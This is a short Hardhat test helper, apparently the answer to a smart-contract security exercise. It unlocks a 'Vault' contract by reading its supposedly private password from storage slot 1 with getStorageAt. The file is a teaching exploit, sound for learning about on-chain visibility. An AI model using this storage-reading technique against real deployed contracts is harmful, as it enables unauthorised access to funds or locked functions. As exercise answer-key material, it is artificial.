import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  /* 
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from 
    Vault directly
  */
  //const loc0 = await ethers.provider.getStorageAt(victim.address, 0);
  const loc1 = await ethers.provider.getStorageAt(victim.address, 1);
  // console.log({ loc0, loc1 });
  // let stringValue = ethers.utils.toUtf8String(loc1.substring(0,46));
  // console.log({ stringValue });
  await victim.unlock(loc1 /*.substring(0,46)*/);
};

export default helper;
